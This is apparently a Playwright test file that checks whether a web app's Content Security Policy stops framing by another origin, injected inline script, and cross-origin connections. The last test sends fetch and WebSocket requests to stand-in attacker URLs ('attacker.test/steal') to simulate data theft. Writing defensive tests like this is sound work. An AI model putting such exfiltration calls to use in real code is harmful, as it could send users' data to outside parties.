import { once } from "node:events";
import { createServer } from "node:http";
import type { Server } from "node:http";

import { expect, test } from "@playwright/test";

import { recordCspViolations } from "./csp.ts";

// Attacks the frontend's Content Security Policy must stop. Each one causes a
// violation on purpose, so these use plain `test`, not the one that fails on
// any violation.

/**
 * Serves a page that frames `target`, from a server of its own on loopback:
 * another origin. A page Playwright makes up would count as public, and
 * Chrome's local network checks would refuse the frame before the CSP could.
 */
const serveFramingPage = async (
  target: string
): Promise<{ url: string; server: Server }> => {
  const server = createServer((_request, response) => {
    response.setHeader("content-type", "text/html");
    response.end(`<iframe src="${target}" title="framed"></iframe>`);
  });
  await once(server.listen(0, "127.0.0.1"), "listening");
  const address = server.address();
  if (address === null || typeof address === "string") {
    throw new Error("The framing page's server has no port");
  }
  return { url: `http://127.0.0.1:${address.port}/`, server };
};

test("can't be framed by another origin", async ({ page, baseURL }) => {
  const app = new URL("/", baseURL);
  const { url, server } = await serveFramingPage(app.href);
  try {
    await page.goto(url);

    // The frame leaves about:blank either way: for the app or, refused, for
    // the browser's error page.
    const framedUrl = () => page.mainFrame().childFrames()[0]?.url() ?? "";
    await expect.poll(framedUrl).toMatch(/^(?!about:blank$)./u);
    expect(framedUrl()).not.toContain(app.host);
    await expect(
      page.frameLocator("iframe").getByRole("heading", { name: "Grasp" })
    ).toHaveCount(0);
  } finally {
    server.close();
  }
});

test("runs no injected inline script", async ({ page }) => {
  const violations = await recordCspViolations(page);
  await page.goto("/");
  await expect(page.getByRole("heading", { name: "Grasp" })).toBeVisible();

  // An inline script runs as it's inserted, if it runs at all.
  const ran = await page.evaluate(() => {
    const script = document.createElement("script");
    script.textContent = "document.body.dataset.injected = 'ran';";
    document.head.append(script);
    return document.body.dataset.injected === "ran";
  });

  expect(ran).toBeFalsy();
  await expect
    .poll(() => violations.some((text) => text.startsWith("script-src")))
    .toBeTruthy();
});

test("connects to no other origin", async ({ page }) => {
  const violations = await recordCspViolations(page);
  await page.goto("/");
  await expect(page.getByText("Connected", { exact: true })).toBeVisible();

  const targets = ["http://attacker.test/steal", "ws://attacker.test/steal"];
  await page.evaluate(async ([http = "", ws = ""]) => {
    await fetch(http).catch((error: unknown) => error);
    try {
      const socket = new WebSocket(ws);
      socket.close();
    } catch {
      // Some browsers refuse in the constructor; either way it's reported.
    }
  }, targets);

  // The other origin doesn't exist, so a failed request proves nothing; the
  // browser's report that the policy refused it does.
  const unrefused = () =>
    targets.filter(
      (target) =>
        !violations.some((text) =>
          text.startsWith(`connect-src blocked ${target}`)
        )
    );
  await expect.poll(unrefused).toStrictEqual([]);
});
